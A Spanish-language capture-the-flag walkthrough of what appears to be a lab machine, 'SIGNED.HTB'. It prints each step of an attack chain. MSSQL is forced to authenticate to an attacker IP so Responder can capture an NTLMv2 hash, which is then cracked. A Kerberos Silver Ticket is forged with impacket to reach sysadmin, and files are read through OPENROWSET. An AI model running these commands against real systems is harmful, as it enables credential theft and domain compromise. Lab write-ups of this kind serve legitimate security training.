Attack Path

03

Captura de Hash — Responder

MSSQL permite hacer queries que generan conexiones hacia servidores externos. Levantamos Responder en nuestra interfaz de VPN para interceptar el hash NTLM cuando el servidor intente autenticarse contra nosotros.

Command — Terminal 1 (Responder)
sudo responder -I tun0
Command — Terminal 2 (desde MSSQL, forzar autenticación)
SQL> SELECT '\\10.10.14.116\share';
Output — Responder captura el hash
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:aaaaaaaaaaaaaaaa:B45F3...
                            ...AA8C0B33A7B8D0F6CAD8BC31:010100000000...

El hash pertenece al usuario mssqlsvc — la cuenta de servicio de MSSQL. Guardamos el hash en un archivo para crackearlo.

Command
echo "mssqlsvc::SIGNED:<hash_completo>" > hashes.txt
04

Hashcat — Cracking NTLMv2

Crackeamos el hash NTLMv2 capturado usando hashcat con el modo 5600 y rockyou.txt.

05

MSSQL Login — mssqlsvc

Nos reconectamos a MSSQL con las credenciales crackeadas usando autenticación Windows.

Command
impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth
Command — Verificar privilegios sysadmin
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
Output
-----------
          0
# 0 = no es sysadmin todavía — necesitamos el Silver Ticket

El usuario mssqlsvc no tiene privilegios de sysadmin directamente. Vamos a forjar un Silver Ticket que nos permita impersonar a un usuario con privilegios elevados.

06

Silver Ticket Attack

Un Silver Ticket es un ticket Kerberos forjado para un servicio específico. Al conocer el hash NT de la cuenta de servicio (mssqlsvc) y el SID del dominio, podemos crear un ticket que impersone a un usuario con privilegios de sysadmin en MSSQL.

Obtener el NT Hash de mssqlsvc

Command — Generar NT hash desde la password
echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
Output
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc

Obtener SID del dominio y RIDs

Command — Desde MSSQL
SQL> SELECT SUSER_SID('SIGNED\IT');
SQL> SELECT SUSER_SID('SIGNED\mssqlsvc');
VariableValor
DOMSIDS-1-5-21-4088429403-1159899800-2753317549
MSSQLSVC_RID1103
IT_RID1105
nthashef699384c3285c54128a3ee1ddb1a0cc

Forjar el Silver Ticket

Command
impacket-ticketer \
  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/DC01.SIGNED.HTB \
  -groups 512,1105 \
  -user-id 1103 mssqlsvc
Output
[*] Creating basic skeleton ticket and PAC Infos
[*] Signing/Encrypting final ticket
[*] Saving ticket in mssqlsvc.ccache
Command — Exportar el ticket
export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"

Usar el Silver Ticket en MSSQL

Command
impacket-mssqlclient -k 'SIGNED.HTB/mssqlsvc@dc01.signed.htb' -windows-auth -no-pass
Command — Verificar sysadmin
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
Output
-----------
          1
# 1 = sysadmin confirmado ✓

Flags — user.txt & root.txt

Con privilegios de sysadmin podemos leer archivos del sistema directamente desde MSSQL usando OPENROWSET.

Command — user.txt
SQL> SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS t;

root.txt a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

08

Summary & Key Takeaways

MSSQL Enumeration

Puerto 1433 expuesto permite login con credenciales encontradas durante enumeración inicial.

Responder — NTLM Capture

MSSQL puede forzar autenticaciones SMB hacia IPs externas. Responder intercepta el hash NTLMv2.

hashcat -m 5600

NTLMv2 crackeado con rockyou.txt revela la password de la cuenta de servicio mssqlsvc.

Silver Ticket Attack

Conociendo el NT hash de mssqlsvc y el SID del dominio, forjamos un ticket Kerberos con privilegios de sysadmin en MSSQL.

OPENROWSET — File Read

Con sysadmin en MSSQL podemos leer cualquier archivo del sistema directamente desde SQL sin necesidad de shell.

Kerberos Silver Ticket

A diferencia del Golden Ticket, el Silver Ticket no requiere comprometer el KDC — solo la cuenta de servicio objetivo.
